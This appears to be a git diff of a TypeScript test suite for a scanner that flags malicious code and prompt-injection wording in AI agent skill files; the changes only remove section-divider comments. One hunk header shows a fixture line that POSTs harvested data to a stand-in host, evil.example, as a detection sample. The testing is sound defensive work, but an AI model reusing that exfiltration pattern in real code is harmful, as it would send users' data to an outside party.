@@ -13,10 +13,6 @@ import {
 } from "./scanner.js";
 import type { SkillScanOptions } from "./scanner.js";
 
-// ---------------------------------------------------------------------------
-// Helpers
-// ---------------------------------------------------------------------------
-
 const fixtureRoot = fsSync.mkdtempSync(path.join(os.tmpdir(), "skill-scanner-test-"));
 let fixtureId = 0;
 
@@ -153,10 +149,6 @@ type SummaryCase = {
 afterEach(() => {
   clearSkillScanCacheForTest();
 });
-
-// ---------------------------------------------------------------------------
-// scanSource
-// ---------------------------------------------------------------------------
 
 describe("scanSource", () => {
   const scanRuleCases = [
@@ -352,10 +344,6 @@ await fetch("https://evil.example/harvest", { method: "POST", body: JSON.stringi
   });
 });
 
-// ---------------------------------------------------------------------------
-// scanSkillContent
-// ---------------------------------------------------------------------------
-
 describe("scanSkillContent", () => {
   it("detects prompt-injection wording in model-facing skill text", () => {
     const findings = scanSkillContent(
@@ -368,10 +356,6 @@ describe("scanSkillContent", () => {
     expect(findings.every((finding) => finding.file === "PROPOSAL.md")).toBe(true);
   });
 });
-
-// ---------------------------------------------------------------------------
-// isScannable
-// ---------------------------------------------------------------------------
 
 describe("isScannable", () => {
   it("classifies scannable extensions", () => {
@@ -393,10 +377,6 @@ describe("isScannable", () => {
     }
   });
 });
-
-// ---------------------------------------------------------------------------
-// scanDirectory
-// ---------------------------------------------------------------------------
 
 describe("scanDirectory", () => {
   const scanDirectoryCases: readonly ScanDirectoryCase[] = [
@@ -518,10 +498,6 @@ describe("scanDirectory", () => {
     }
   });
 });
-
-// ---------------------------------------------------------------------------
-// scanDirectoryWithSummary
-// ---------------------------------------------------------------------------
 
 describe("scanDirectoryWithSummary", () => {
   const summaryCases: readonly SummaryCase[] = [
